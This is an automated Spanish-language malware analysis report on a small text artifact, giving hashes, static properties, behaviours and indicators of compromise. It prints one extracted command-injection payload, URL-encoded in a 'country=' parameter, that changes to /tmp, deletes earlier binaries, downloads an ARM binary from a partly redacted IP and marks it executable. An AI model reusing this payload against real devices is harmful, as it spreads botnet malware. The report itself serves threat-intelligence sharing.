# 🧬 Payload Analysis

`614a34641a903a222acf9a7d59a72a8a7ab53fa15b7b98807968ae88b6033a03`

## 📌 Resumen

Artefacto de 350 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.20. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 3 indicadores técnicos.


## 🏷️ Clasificación

- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:11.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `614a34641a903a222acf9a7d59a72a8a7ab53fa15b7b98807968ae88b6033a03`
- **SHA1:** `61656543a34a63fc19783734fb50f4f93371e8be`
- **MD5:** `fb68bbba828c7b24ee44b2e0d7da9f21`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 350 B |
| Entropía | 5.2 |
| Strings | 4 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
country=;cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bhttp:/\/201.51.13.XXX/main_arm7;chmod%2B777%2Bmain_arm7;
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 201.51.13.XXX | static_analysis |
| ip | 190.179.168.XXX | static_analysis |
| command | country=;cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bhttp:/\/201.51.13.XXX/main_arm7;chmod%2B777%2Bmain_arm7; | strings |
| hash | 614a34641a903a222acf9a7d59a72a8a7ab53fa15b7b98807968ae88b6033a03 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
